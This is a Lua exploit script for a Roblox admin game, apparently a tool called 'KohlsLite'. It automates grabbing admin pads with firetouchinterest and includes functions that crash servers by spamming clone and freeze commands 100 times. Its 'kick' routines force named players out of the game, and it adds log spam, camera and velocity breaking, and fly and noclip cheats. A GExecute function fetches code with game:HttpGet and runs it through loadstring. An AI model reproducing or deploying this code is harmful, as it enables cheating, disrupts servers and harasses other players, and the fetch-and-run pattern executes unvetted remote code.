task.spawn(function()
   while true do
   task.wait(0)
   if loopgrab2 then
      local pads = game.Workspace.Terrain._Game.Admin.Pads:GetChildren()
      for i, pad in ipairs(pads) do
         local head = pad:FindFirstChild("Head")
         local character = game.Players.LocalPlayer.Character
         local headOfCharacter = character and character:FindFirstChild("Head")

         if head and headOfCharacter and firetouchinterest then
            firetouchinterest(head, headOfCharacter, 1)
            firetouchinterest(head, headOfCharacter, 0)
            firetouchinterest(head, headOfCharacter, 1)
            wait()
            firetouchinterest(head, headOfCharacter, 0)

            if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
               Regen()
            end
         end
      end
   end
   end
end)

-- PERM 1
task.spawn(function()
    while true do 
        task.wait(0)
        coroutine.wrap(function()
                              local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                              if (perm ~= true or workspace.Terrain._Game.Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") ~= nil) and firetouchinterest then 
                              else
                                    pcall(function()
                                              local pad = workspace.Terrain._Game.Admin.Pads:FindFirstChild("Touch to get admin")
                                              local a = pad.Head
                                              firetouchinterest(a, spr, 1)
                                              firetouchinterest(a, spr, 0)
                                              firetouchinterest(a, spr, 1)
                                              task.wait()
                                              firetouchinterest(a, spr, 0)
                                    end)
                              end
        end)()
    end
end)

-- PERM 2
task.spawn(function()
    while true do
        task.wait(0)
        if perm2 == true then
            if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
                  if game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin") then
                      local pad = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head")
                      local padCFrame = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head").CFrame
                      task.wait(0.125)
                      pad.CanCollide = false
                      repeat task.wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                      pad.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                      task.wait(0.125)
                      pad.CFrame = padCFrame
                      pad.CanCollide = true
                  else
                        Regen()
                  end
            end
        end
  end
end)

-- PAD REINFORCEMENTS AND PADBANNED
task.spawn(function()
        while true do
                task.wait(0)
                for i,player in pairs(padbanned) do
                        task.wait(0)
                        for i,pad in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetDescendants()) do
                                if pad.Name == player.."'s admin" then
                                        Chat("respawn "..player)
                                        Chat("h \n\n\n [KohlsLite]: Sorry, "..player..", you're banned from using the admin pads! \n\n\n")
                                        Regen()
                                end
                        end
                end

                if padreinforcements == true then
                        for i,v in pairs(game.Players:GetChildren()) do
                                local times = 0
                                for i,pad in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetDescendants()) do
                                        if pad.Name == v.Name.."'s admin" then
                                                times = times + 1
                                        end
                                end
                                if times >= 2 then
                                        Chat("respawn "..v.Name)
                                        Chat("h \n\n\n [KohlsLite]: The pads have been reset because "..v.Name.." tried to take them all! \n\n\n")
                                        Regen()
                                end
                        end
                end
        end
end)

-- ALL PADS
function AllPads()
        local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
        for i, pad in pairs(pads) do
                task.spawn(function()
                        pad.PrimaryPart = pad:FindFirstChild("Head")
                        local pos = pad.PrimaryPart.CFrame
                        wait(0)
                        pad.PrimaryPart.CanCollide = false
                        pad:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
                        wait(0)
                        pad:SetPrimaryPartCFrame(pos)
                        pad.PrimaryPart.CanCollide = true
                end)
        end
end

-- MUSIC RELATED
task.spawn(function()
 while true do
    task.wait(0)

    if antimusic == true then
                  for i,v in pairs(workspace:GetDescendants()) do
                            if v:IsA("Sound") then 
                                if v.Playing then 
                                        v:Stop() 
                                end 
                        end
                         end
    end

    if audiotroll == true then
                        if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                                game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimePosition = math.random(0,game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimeLength*100)/100
                        end
    end

    if mymusiconly == true then
            local soundlock = tonumber(mymusiconlyid)
            local origsound = soundlock
            soundlock = "http://www.roblox.com/asset/?id="..tostring(soundlock)
            local lastUpdateTime = tick()
        local music = workspace.Terrain["_Game"].Folder:FindFirstChild("Sound")
        if gottenmode == 1 then
                    gwawg = tonumber(music.TimePosition)
                print(music.TimePosition)
        else 
                gwawg = 0
        end
            repeat 
                task.wait(0.1)
                local currentTime = tick() 
                local elapsedTime = currentTime - lastUpdateTime 
                lastUpdateTime = currentTime 

                        gwawg = gwawg + elapsedTime 

                if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound") and musicoff == false then
                            local music = workspace.Terrain["_Game"].Folder:FindFirstChild("Sound")
                            if music.IsLoaded and music.SoundId == soundlock then
                                -- print(music.TimePosition);print(gwawg)
                                if gwawg > music.TimeLength then 
                                            gwawg = 0 
                                end 

                                if math.abs(music.TimePosition - gwawg) > 0.5 then
                                            if gwawg < music.TimePosition - 1 or gwawg > music.TimePosition + 1 then
                                                       print(music.TimePosition) ; print(gwawg)
                                                       music.TimePosition = gwawg ; Remind("Fixed the time position!")
                                           end
                                end
                            end

                            if music.SoundId ~= soundlock then
                                if musicoff == false then
                                        if antimlog then
                                                    Chat("music 00000000000000000000000000000"..tostring(origsound))
                                        else
                                                    Chat("music "..tostring(origsound))
                                        end
                                end                    
                            end

                            if music.Playing == false and musicoff == false then
                                        music:Play() 
                            end
                else
                        if musicoff == false then
                                    if antimlog then
                                        Chat("music 00000000000000000000000000000"..tostring(origsound))
                                    else
                                                Chat("music "..tostring(origsound))
                                end
                            end
                end
                    until not mymusiconly
        end
  end

end)

-- GOTO
function Goto()
          Chat("tp me "..gotou)
end

-- for cframe goto
function Goto2(person)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = person.Character.HumanoidRootPart.CFrame
end

-- BRING
function Bring()
      Chat("tp "..bringu.." me")
end


function VFix()
    for i,v in pairs(game:GetService("Workspace").Terrain._Game.Workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Velocity = Vector3.new(0,0,0)
        end
    end
    game.Workspace.Terrain._Game.Workspace.Baseplate.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
end

function ColFix()
         for i, v in pairs(game.Workspace:GetDescendants()) do
                -- if allclear() == false then break end
                if v:IsA("Part") then
                        v.CanCollide = true
                end
        end
end

function DisCol()
         for i, v in pairs(game.Workspace:GetDescendants()) do
                if allclear() == false then break end
                if v:IsA("Part") then
                        v.CanCollide = false
                end
        end
end

function GravFix()
      workspace.Gravity = 196.2
end

-- FREEZE CRASH
function FCrash()
      for i = 1,100 do
          Chat("clone all all all                                dsc.gg/kohlslite")
          Chat("freeze all all all                                dsc.gg/kohlslite")
      end
end

-- DOG CRASH
function DCrash()
      for i = 1,100 do
          Chat("clone all all all                                dsc.gg/kohlslite")
          Chat("dog all all all                                  dsc.gg/kohlslite")
      end
end

-- SHIELD CRASH
function SCrash()
      for i = 1,100 do
          Chat("shield/all/all/all")
          Chat("rocket/all/all/all")
          Chat("clone all all all			dsc.gg/kohlslite")
      end
end

-- rocket kick
function rkickplr(rkicker,rkicks)
Chat("respawn "..rkicks)
Chat("setgrav "..rkicks.. " 3500")
Chat("jail/".. rkicks)
task.spawn(function() 
	while true do 
		task.wait(0)

                if not game.Players.LocalPlayer.Character then 
                        repeat task.wait(0) until game.Players.LocalPlayer.Character 
                end

                if not rkicker.Character then 
                        if rkicker then
                                repeat task.wait(0) until rkicker.Character or not rkicker or srkick == false
				if not rkicker then 
					srkick = false 
				end
                        else 
                                srkick = false
                        end
                end

                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
               		if v.Name == "Rocket" then
                                v.CanCollide = false 
              		end
                end

                for i,v in pairs(rkicker.Character:GetChildren()) do
                        if v.Name == "Rocket" then 
                                v.CanCollide = false 
                        end
                end

		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = rkicker.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(180),0)*CFrame.new(0,0,-2)

                for i = 1,100 do
                          Chat("rocket/"..rkicks.."/"..rkicks.."/"..rkicks)
                          Chat("rocket/me/me/me")
			  if srkick == false then break end
			  if not rkicker then break end
                end
	end
end)
end

-- FOG DANCING
task.spawn(function()
   while true do
        task.wait(0.1) -- rate limit
        if fogdance == true then
                        if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                                        pbl = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness / 10
                                        Chat("fogend "..pbl)
                        end
        end

        if ccolours == true then
                        Chat("fogend 0")
                        Chat("fogcolor " ..tostring(math.random(0, 255)) .." " .. tostring(math.random(0, 255)) .. " " .. tostring(math.random(0, 255)))
        end
   end
end)

-- LOG SPAM
function LogSpam()
      for i = 1,50 do
          Chat("reset KOHLSLITE ON BOTTOM - ts2021, 2024")
          Chat("reset PR SCRIPT ON TOP - atprog, 2024")
      end
end

function InitTool()
                Remind("Gave you the click-tp tool!")
                mouse = game.Players.LocalPlayer:GetMouse()
                hum = game.Players.LocalPlayer.Character.HumanoidRootPart
                local tptool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)

                tptool.Name = "ClickTP"
                tptool.CanBeDropped = false
                tptool.RequiresHandle = false

                tptool.Activated:Connect(function()
                        if mouse.Target then
                                hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z) 
                        end
                end)
end

-- NAME HECK
task.spawn(function()
        while true do
                task.wait()
                for i, v in ipairs(game.Players:GetPlayers()) do
                        if table.find(byecam, v.Name) then
                                if v and not v.Character:FindFirstChildOfClass("Model") then
                                         Chat("name ".. v.Name .." [BROKE]")
                                end
                        end
                        if table.find(carcar, v.Name) then
                                Chat("gear ".. v.Name .." 253519495")
                        end
                      end
      end
end)

-- FIND REGEN
task.spawn(function()
        while true do
                task.wait(0)
                if regenfind == true then
                        local root = game.Players.LocalPlayer.Character.HumanoidRootPart
                        root.Anchored = true
                        repeat
                                wait(.15)
                                root.CFrame = CFrame.new(-7.165, root.Position.Y + 2500 , 94.743)
                        until workspace.Terrain._Game.Admin:FindFirstChild("Regen") or regenfind == false
                        root.Anchored = false
                        root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0, 3, 0)
                        regenfind = false
                        Chat("respawn me");Remind("Found the regen (skydived)")
                end
                if regenfind2 == true then
			local Player = game.Players.LocalPlayer
			local PlayerService = game:GetService("Players")
                        local root = game.Players.LocalPlayer.Character.HumanoidRootPart
                        root.Anchored = true
                        repeat
                                task.wait(.15)
                                root.CFrame = CFrame.new(math.random(-30593, -23388), math.random(-30593, -10455), math.random(-30593, -10455))
                        until workspace.Terrain._Game.Admin:FindFirstChild("Regen") or regenfind2 == false
			PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                        root.Anchored = false
                        root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0, 3, 0)
                        regenfind2 = false
                        Chat("respawn me");Remind("Found the regen (KL)")
                end
        end
end)

-- leaked regen
function leakedcords()

	local Player = game.Players.LocalPlayer
	local PlayerService = game:GetService("Players")

	local function clientloadpos(thecord) -- cmdy
		PlayerService.LocalPlayer.Character.Parent = workspace
		PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = thecord
	end

	clientloadpos(CFrame.new(Vector3.new(1000000, 1000000, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, 1000003, -1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, -1000003, -1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, -1000000, -3)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(3, -1000000, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, -3, -1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(-1000000, -3, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, 3, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, 1000003, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(1000000, -1000003, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(454545, 150000, -678678)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(306712, 420552, 398158)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(-1000000, 1000003, 1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(-1000000, 1000003, -1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(-1000000, -1000003, -1000000)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(45400, -49860, 56673)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(56470, -48312, 28578)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(75304, -49638, 47300)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(34120, -48830, 30233)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(34120, -48830, 30233)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(77822, -49751, 79116)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(42682, -29202, 29886)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(51052, -49558, 34068)));task.wait(.5)
	clientloadpos(CFrame.new(Vector3.new(-251773, 1000003, 382563)));task.wait(.5)
	clientloadpos(CFrame.new(0, 2.5, 0));task.wait(.5)
	if workspace.Terrain._Game.Admin:FindFirstChild("Regen") then
		Remind("Found regen!");Chat("respawn me")
	else
		Remind("Couldn't find regen!");Chat("respawn me")
	end

end


-- LUA CMDS
function Execute(testcode)
      loadstring(testcode)()
end

-- LUA EXECUTE
function GExecute(myscript)
                loadstring(game:HttpGet((myscript),true))()
end

-- ANNOUNCEMENTS
function Announce()
      Chat("h \n\n\n "..annsecret.. " \n\n\n")
end

-- we do a bit of trolling
function AnnounceWM()
      Chat("h \n\n\n "..sus..": "..whatsapp.. " \n\n\n")
end
                       
function dkick(dk, dkicked)
	    local ota = #workspace:FindFirstChild(dkicked):GetChildren()
            Chat('skydive ' .. dkicked)
            repeat task.wait() until workspace:FindFirstChild(dkicked).HumanoidRootPart.CFrame.Y >= 999
            task.wait()
            Chat('punish ' .. dkicked)
            repeat task.wait() until game.Lighting:FindFirstChild(dkicked)

            repeat 
                if not game.Lighting:FindFirstChild(dkicked) then
                    Chat('punish ' .. dkicked) 
                end 
                task.wait() 
                Chat("dog " .. dkicked .. " " .. dkicked .. " " .. dkicked)
                task.wait() 
                Chat("freeze " .. dkicked .. " " .. dkicked .. " " .. dkicked) 
            until 
                (#game.Lighting:FindFirstChild(dkicked):GetChildren() - ota) >= 1500 or dkickin == false

	    if dkickin == false then 
	    else
            	task.wait(.5)
            	Chat("noclip " .. dkicked)
            	task.wait()
            	Chat('unpunish ' .. dkicked)
           	task.wait()
            	Chat('kill ' .. dkicked .. " " .. dkicked .. " " .. dkicked)
	    	dkickin = false
            end
end

-- SPAWN SAVED
function Spawn()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savspawn
end

-- SET SPAWN
function SSpawn()
        savspawn = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        print("Your saved spawn is: "..savspawn)
end

-- CURRENT POS
function PSpawn()
        print("Your current position is: "..game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
end

-- HOUSE
function House()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-31.0896435, 8.22999477, 70.522644, -0.999961913, 4.495271e-08, -0.0087288795, 4.55292621e-08, 1, -6.58523618e-08, 0.0087288795, -6.62472743e-08, -0.999961913)
end

-- SPAWN
function GSpawn()
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-29, 3.70000005, -25.5900116))
end

-- Cam Break
function NoCam()
      Chat("gear me 4842207161")
      repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("AR")
      local cambrek = game.Players.LocalPlayer.Backpack:FindFirstChild("AR")
      cambrek.Parent = game.Players.LocalPlayer.Character
      task.wait(0.2)
      cambrek:Activate()
      Remind("The camera is now broken into shiftlock - you won't see the effect until you rejoin.")
end

function NoVelo()
    Chat("gear me 111876831")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("April Showers")
    local aps = game.Players.LocalPlayer.Backpack:FindFirstChild("April Showers")
    aps.Parent = game.Players.LocalPlayer.Character
    wait(0.2)
    aps:Activate()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer:GetMouse().Hit.p.X,game.Players.LocalPlayer:GetMouse().Hit.p.Y,game.Players.LocalPlayer:GetMouse().Hit.p.Z)
    task.wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,3.6)
    Remind("Please wait for 15 seconds...");task.wait(5);Remind("10 more seconds...");task.wait(5);Remind("5 more seconds...");task.wait(5)
    Chat("gear me 110789105")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("RageTable")
    local rage = game.Players.LocalPlayer.Backpack:FindFirstChild("RageTable")
    rage.Parent = game.Players.LocalPlayer.Character
    wait(0.2)
    rage:Activate()
    Remind("Velocity should be broken for the object you wanted it to do so!")
end


-- BREAK AND FIX CAM 2
function TogCam()
    Chat("tp others me")
    Chat("gear me 68354832")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("BlizzardWand")
    local wand = game.Players.LocalPlayer.Backpack:FindFirstChild("BlizzardWand")
    wand.Parent = game.Players.LocalPlayer.Character
    wait(0.2)
    wand:Activate()
end

function FCAM()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999,99999,99999)
	local instancechina = Instance.new("Part",game.Players.LocalPlayer.Character)
	instancechina.Anchored = true
	instancechina.Size = Vector3.new(10,1,10)
	instancechina.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-5,0)
    	Chat("gear me 94794847")
    	repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    	local VampireVanquisher = game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    	VampireVanquisher.Parent = game.Players.LocalPlayer.Character
    	repeat task.wait() until not game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Coffin")
    	repeat task.wait()
    		firetouchinterest(VampireVanquisher.Handle,v.Character.Head,0)
		firetouchinterest(VampireVanquisher.Handle,v.Character.Head,1)
    	until game.Players.LocalPlayer:DistanceFromCharacter(v.Character.Head.Position) < 10
        Chat("respawn me")
end

-- FIX CAM (client)
function FixCam()
                task.spawn(function()
                        local Player = game.Players.LocalPlayer
                        local PlayerService = game:GetService("Players")
                        local lp = PlayerService.LocalPlayer
                        local UIS = game:GetService("UserInputService")
                        local CAS = game:GetService("ContextActionService")
                        local RUS = game:GetService('RunService')
                        CAS:UnbindAction("ShoulderCameraSprint")
                        RUS:UnbindFromRenderStep("ShoulderCameraUpdate")
                        CAS:UnbindAction("ShoulderCameraZoom")
                        while true do
                                task.wait()
                                repeat game:GetService('RunService').Heartbeat:Wait() until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
                                RUS:UnbindFromRenderStep("ShoulderCameraUpdate")
                                CAS:UnbindAction("ShoulderCameraZoom")
                                CAS:UnbindAction("ShoulderCameraSprint")
                                local WEPSYS = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
                                if not WEPSYS then return end
                                for i,v in pairs(WEPSYS:GetDescendants()) do
                                        if v:IsA("Script") then
                                                v.Disabled = true
                                        end
                                        v:Destroy()
                                end
                                local CWS = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
                                local WSG = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
                                local CWS_2 = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
                                local Camera = game:GetService("Workspace"):FindFirstChild("Camera")
                                if CWS then CWS.Disabled = true CWS:Destroy() end
                                if WSG then WSG:Destroy() end
                                if CWS_2 then
                                        CWS_2.Disabled = true
                                        CWS_2:Destroy()
                                end
                                game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
                                UIS.MouseIconEnabled = true
                                PlayerService.LocalPlayer.CameraMaxZoomDistance = 400
                                PlayerService.LocalPlayer.CameraMinZoomDistance = 0.5
                                Camera.FieldOfView = 70
                                game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
                                game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
                                lp.Character.Humanoid.AutoRotate = true 
                        end
                end)
end

-- INFINITE JUMP
game:GetService("UserInputService").JumpRequest:Connect(function()
            task.wait(0)
            if INFJUMP == true then
               game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
            end
end)

-- NOK
function NOK()
  game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump.TouchInterest:destroy()
  game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump1.TouchInterest:destroy()
  game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump2.TouchInterest:destroy()
  game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump3.TouchInterest:destroy()
  game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump4.TouchInterest:destroy()
  game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump5.TouchInterest:destroy()
  game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump6.TouchInterest:destroy()
  game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump7.TouchInterest:destroy()
  game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump8.TouchInterest:destroy()
  game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9.TouchInterest:destroy()
  Remind("Rejoin the server to revert!")
end

-- NOK 2
function NOK2()
  for i,v in pairs(workspace.Terrain["_Game"]["Workspace"].Obby:GetDescendants()) do
        if v:IsA("TouchTransmitter") then 
                        v:Destroy() 
        end
  end
  Remind("Rejoin the server to revert!")
end

-- temp NOK
function TNOK(mode) -- vitalux cmd
        for i, v in pairs(game:GetService("Workspace").Terrain._Game.Workspace.Obby:GetChildren()) do -- also removes obby walls collision 
                if mode == "true" then
                        v.CanTouch = false
                else
                        v.CanTouch = true
                end
        end
end

-- PING
function GetPing()
   local RSP = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() + 0.5) -- i can't be bothered to use a more precise version. it's only a 1ms difference if it's rounded wrong xd
   Speak("[KohlsLite]: Ping is " .. RSP .. "ms.")
end

function FRespawn()
    game.Players.LocalPlayer.Character:Destroy()
end

function MRespawn()
			local Player = game.Players.LocalPlayer
			local PlayerService = game:GetService("Players")
                        local char = game.Players.LocalPlayer.Character
                        if char:FindFirstChildOfClass("Humanoid") then 
                                char:FindFirstChildOfClass("Humanoid"):ChangeState(15) 
                        end
                        char:ClearAllChildren()
                        local newChar = Instance.new("Model")
                        newChar.Parent = workspace
                        PlayerService.LocalPlayer.Character = newChar
                        wait()
                        PlayerService.LocalPlayer.Character = char
                        newChar:Destroy()
end

function Dummy()
                        local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                        Chat("char me 5647726938")
                        task.wait(0.5)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
                        Chat("face me 8560971")
                        Chat("unpants me")
                        repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Pants")
                        task.wait(0.5)
                        Chat("name me NPC")
                        repeat task.wait() until game.Players.LocalPlayer.Character:FindFirstChild("NPC")
                        Chat("clone me")
                        task.wait(0.5)
                        Chat("unchar me")
                        task.wait(0.5)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end

-- Removing and adding the obby locally
function LocalObby(mode)
        if mode == "add" then
                 game.Chat:FindFirstChild("Obby").Parent = workspace.Terrain["_Game"]["Workspace"]
                     game.Chat:FindFirstChild("Obby Box").Parent = workspace.Terrain["_Game"]["Workspace"]
        else 
                    workspace.Terrain["_Game"]["Workspace"].Obby.Parent = game.Chat
                        workspace.Terrain["_Game"]["Workspace"]["Obby Box"].Parent = game.Chat
        end
end

function WalkThru(mode)
        if mode == "on" then
                        for _, child in pairs(game.Workspace:GetDescendants()) do
                                if child:IsA("BasePart") and child.CanCollide == true then
                                        child.CanCollide = false
                                end
                        end
        else 
                    for _, child in pairs(game.Workspace:GetDescendants()) do
                                if child:IsA("BasePart") and child.CanCollide == false then
                                        child.CanCollide = true
                                end
                    end
        end
end

-- KAH fly
function UFLY()

	eincrash = false
	local isFlying = true

	local bodyGyro = nil
	local bodyVel = nil
	local mathObj = 0

	local movementVector = { f = 0, b = 0, l = 0, r = 0 }
	local movementVector2 = { f = 0, b = 0, l = 0, r = 0 }

	local maxspeed = 50
	local speed = 0

	local plrs = game:GetService("Players")
	local localPlr = plrs.LocalPlayer
	local mouse = localPlr:GetMouse()
	local character = localPlr.Character
	local playerTorso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")

	local keyConnection1, keyConnection2

	function Fly()
		character.Humanoid.PlatformStand = true

		bodyGyro = Instance.new("BodyGyro", playerTorso)
		bodyGyro.P = 90000
		bodyGyro.maxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
		bodyGyro.cframe = playerTorso.CFrame
		bodyVel = Instance.new("BodyVelocity", playerTorso)
		bodyVel.velocity = Vector3.new(0, 0.1, 0)
		bodyVel.maxForce = Vector3.new(9000000000, 9000000000, 9000000000)
		while isFlying do
			wait()

			if eincrash then 
				isFlying = false 
				break 
			end
			
			if movementVector.l + movementVector.r == 0 then
				if movementVector.f + movementVector.b ~= 0 then
					mathObj = mathObj + 0.5 + mathObj / maxspeed
					if maxspeed < mathObj then
						mathObj = maxspeed
					end
				elseif movementVector.l + movementVector.r == 0 then
					if movementVector.f + movementVector.b == 0 then
						if mathObj ~= 0 then
							mathObj = mathObj - 1
							if mathObj < 0 then
								mathObj = 0
							end
						end
					end
				end
			else
				mathObj = mathObj + 0.5 + mathObj / maxspeed
				if maxspeed < mathObj then
					mathObj = maxspeed
				end
			end
			if movementVector.l + movementVector.r == 0 then
				if movementVector.f + movementVector.b ~= 0 then
					bodyVel.velocity = (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (movementVector.f + movementVector.b) + (game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(movementVector.l + movementVector.r, (movementVector.f + movementVector.b) * 0.2, 0).p - game.Workspace.CurrentCamera.CoordinateFrame.p)) * mathObj
					movementVector2 = {
						f = movementVector.f, 
						b = movementVector.b, 
						l = movementVector.l, 
						r = movementVector.r
					}
				elseif movementVector.l + movementVector.r == 0 then
					if movementVector.f + movementVector.b == 0 then
						if mathObj ~= 0 then
							bodyVel.velocity = (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (movementVector2.f + movementVector2.b) + (game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(movementVector2.l + movementVector2.r, (movementVector2.f + movementVector2.b) * 0.2, 0).p - game.Workspace.CurrentCamera.CoordinateFrame.p)) * mathObj
						else
							bodyVel.velocity = Vector3.new(0, 0.1, 0)
						end
					else
						bodyVel.velocity = Vector3.new(0, 0.1, 0)
					end
				else
					bodyVel.velocity = Vector3.new(0, 0.1, 0)
				end
			else
				bodyVel.velocity = (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (movementVector.f + movementVector.b) + (game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(movementVector.l + movementVector.r, (movementVector.f + movementVector.b) * 0.2, 0).p - game.Workspace.CurrentCamera.CoordinateFrame.p)) * mathObj
				movementVector2 = {
					f = movementVector.f, 
					b = movementVector.b, 
					l = movementVector.l, 
					r = movementVector.r
				}
			end
			bodyGyro.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((movementVector.f + movementVector.b) * maxspeed * mathObj / maxspeed), 0, 0)
			if isFlying then
			else
				break
			end		
		end
		movementVector = { f = 0, b = 0, l = 0, r = 0 }
		movementVector2 = { f = 0, b = 0, l = 0, r = 0 }
		mathObj = 0
		bodyGyro:Destroy()
		bodyVel:Destroy()
		character.Humanoid.PlatformStand = false
	end

	keyConnection1 = mouse.KeyDown:connect(function(kc)
		if kc:lower() == "e" then
			if isFlying then
				isFlying = false
				return
			else
				isFlying = true
				Fly()
				return
			end
		end
		
		if kc:lower() == "w" then
			movementVector.f = 1
			return
		end
		
		if kc:lower() == "s" then
			movementVector.b = -1
			return
		end
		
		if kc:lower() == "a" then
			movementVector.l = -1
			return
		end
		
		if kc:lower() == "d" then
			movementVector.r = 1
		end
	end)

	keyConnection2 = mouse.KeyUp:connect(function(kc)
		if kc:lower() == "w" then
			movementVector.f = 0
			return
		end
		
		if kc:lower() == "s" then
			movementVector.b = 0
			return
		end
		
		if kc:lower() == "a" then
			movementVector.l = 0
			return
		end
		
		if kc:lower() == "d" then
			movementVector.r = 0
		end
	end)

	Fly()

	while true do task.wait(0) 
		if eincrash then 
			isFlying = false ; keyConnection1:Disconnect() ;  keyConnection2:Disconnect() 
			break
			end
		end
end

SkipEvent = Instance.new("BindableEvent")
